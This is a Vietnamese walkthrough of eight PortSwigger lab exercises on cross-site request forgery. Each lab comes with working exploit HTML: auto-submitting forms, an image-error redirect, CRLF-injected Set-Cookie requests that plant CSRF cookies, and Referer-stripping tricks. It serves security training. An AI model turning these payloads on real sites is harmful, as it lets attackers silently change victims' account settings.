# 1. CSRF vulnerability with no defenses
Vào exploit server, cấu hình đoạn HTML sau:

```
<form id="form" method="POST" action="https://0afb00eb04d9b8bec0d9405a00290069.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker2@email.com">
</form>

<script>form.submit()</script>
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 2. CSRF where token validation depends on request method
Request thay đổi email là `POST /my-account/change-email` với hai tham số `email` và `csrf`. Tuy nhiên nhận thấy nếu ta thay đổi request thành `GET /my-account/change-email?email=attacker%40gmail.com`, cho dù không có tham số `csrf` thì email vẫn bị thay đổi thành công

Vào exploit server cấu hình đoạn XML sau:

```
<img src=1 onerror="document.location='https://0a06005e03421b53c1c14436007600ad.web-security-academy.net/my-account/change-email?email=attacker@gmail.com'">
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 3. CSRF where token validation depends on token being present
Ta thấy khi trong request không có tham số `csrf`, email vẫn bị thay đổi. Như vậy ta vào exploit server và cấu hình đoạn HTML:

```
<form method="POST" action="https://0a35003f047cea06c1019ee1003c006c.web-security-academy.net/my-account/change-email" id="form">
<input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>form.submit()</script>
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 4. CSRF where token is not tied to user session
Đăng nhập vào tài khoản wiener:peter rồi vào trang "My account", lưu lại csrf token. Sau đó logout rồi đăng nhập vào tài khoản carlos:montoya, dùng session của carlos và csrf token đã lưu của wiener để submit một request `POST /my-account/change-email`. Kết quả email bị thay đổi. Như vậy giữa csrf và session không có mối liên hệ với nhau. Với một csrf token chưa được sử dụng, ta có thể submit với bất kỳ session nào.

Ta đăng nhập lại tài khoản wiener:peter, lưu lại csrf token là `w9lcvACTQ0fT30znoZiPT42ILgGHkFnF`, sau đó và exploit server để cấu hình đoạn HTML sau:

```
<form id="form" method="POST" action="https://0a1a008e03260d9ac1a3879500b300b3.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@gmail.com">
<input type="hidden" name="csrf" value="w9lcvACTQ0fT30znoZiPT42ILgGHkFnF">
</form>

<script>form.submit();</script>
```

Sau khi click "Deliver to victim", bài lab được giải thành công.

# 5. CSRF where token is tied to non-session cookie
Ta thấy trong form thay đổi email có chứa csrf token, tuy nhiên token này phụ thuộc vào cookie `csrfKey`, miễn là `csrfKey` và thuộc tính `csrf` phù hợp với nhau thì có thể submit thành công.

Trong chức năng search của website, thử `/?search=abc` thì thấy trong response có header `Set-Cookie: LastSearchTerm=abc; Secure; HttpOnly`. Ta sẽ thử xem có thể thiết lập một cookie mới với chức năng Search hay không. Gửi request `GET /?search=abc%0D%0ASet-Cookie:+abc%3Ddef`, ta thấy header `Set-Cookie` trong response đã bị xuống dòng và thêm một header Set-Cookie mới:

![image](https://user-images.githubusercontent.com/103978452/209636281-7492097f-eaf0-4cda-bf42-fcd4fbda9dd6.png)

Như vậy, ta thử ghi đè lên cookie csrfKey bằng cách gửi request: `GET /?search=abc%0D%0ASet-Cookie%3A+csrfKey%3D4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx%3B+Path%3D%2F%3B+SameSite%3DNone`.

Kết quả như sau:

![image](https://user-images.githubusercontent.com/103978452/209636456-760b8977-96e6-4c40-85f9-94220d22f43b.png)

Như vậy, ta có thể thay đổi cookie csrfKey của nạn nhân. Ta có kịch bản tấn công như sau:

1) Từ session của mình, lấy ra cookie `csrfKey=4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx` và token `csrf=Bt0qvdZVXoUpfTmoDGy54RJIxytRR1SP`
2) Dùng tag `<img>` để thay đổi cookie `csrfKey` của nạn nhân
3) Gửi request đổi email với csrf token đã có

Vào exploit server và cấu hình đoạn HTML sau:
```
<img src="https://0aa900e403ad1a02c0b0125d00b000d9.web-security-academy.net/?search=abc%0D%0ASet-Cookie%3A+csrfKey%3D4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx%3B+Path%3D%2F%3B+SameSite%3DNone">
<form id="form" method="POST" action="https://0aa900e403ad1a02c0b0125d00b000d9.web-security-academy.net/my-account/change-email">
<input type="hidden" value="attacker00022@gmail.com" name="email">
<input type="hidden" value="Bt0qvdZVXoUpfTmoDGy54RJIxytRR1SP" name="csrf">
</form>
<script>form.submit()</script>
```

Sau khi click "Deliver to victim", kết quả thành công.

# 6. CSRF where token is duplicated in cookie
Ta thấy chỉ cần cookie `csrf` và csrf token trong request là hai chuỗi giống nhau thì request đổi email sẽ thành công. Và trong website vẫn có lỗi chèn thêm header như trong lab #5.

Để thay đổi cookie `csrf=abc`, ta gửi request sau:
```
GET /?search=abc%0d%0aSet-Cookie%3A+csrf%3Dabc%3B+Path%3D%2F%3B+SameSite%3DNone HTTP/1.1
```

Vào trong exploit server và cấu hình đoạn HTML sau:
```
<img src="https://0a1f008803dca8b6c277137100120000.web-security-academy.net/?search=abc%0d%0aSet-Cookie%3A+csrf%3Dabc%3B+Path%3D%2F%3B+SameSite%3DNone">
<form id="form" method="POST" action="https://0a1f008803dca8b6c277137100120000.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@gmail.com">
<input type="hidden" name="csrf" value="abc">
</form>
<script>form.submit()</script>
```

Sau khi submit, bài lab được giải thành công.

# 7. CSRF where Referer validation depends on header being present
Ta thấy việc email có được thay đổi thành công hay không phụ thuộc vào việc Referer header có domain là `https://0a90007603f431c2c167ad45006f00b0.web-security-academy.net` hay không. Tuy nhiên nếu ta xóa đi Referer header, email vẫn bị thay đổi.

Như vậy, ta vào exploit server và cấu hình đoạn HTML sau:
```
<html>
<head>
<meta name="referrer" content="never">
</head>
<body>
<form id="form" method="POST" action="https://0a90007603f431c2c167ad45006f00b0.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>form.submit()</script>
</body>
</html>
```

Thẻ `<meta name="referrer" content="never">` sẽ ngăn không đưa dữ liệu vào header Referer của request tiếp theo. Sau khi click "Deliver to victim", kết quả thành công. 

# 8. CSRF with broken Referer validation
Trong chức năng thay đổi email, sau một vài lần check thì ta nhận thấy chỉ khi trong header `Referrer` có chuỗi `0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net` thì mới có thể submit thành công.

Như vậy, ta vào exploit server và cấu hình đoạn code sau:
```
<form id="form" method="POST" action="https://0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="hello@gmail.com">
</form>
<script>
if(document.location.search==''){
  document.location="https://exploit-0ac8005903fbd08ac2770c95014d0097.exploit-server.net/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net"
}else{
  form.submit();
}
</script>
```

Đoạn code trên đầu tiên sẽ đưa người dùng đến `<exploit-server>/exploit`, sau đó tự động chuyển hướng đến `<exploit-server>/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net`, cuối cùng mới submit form để tấn công CSRF. Ta cấu hình HTTP header `Referrer-Policy: unsafe-url` để Referrer header chứa cả query string.

Sau khi submit, kết quả thành công.
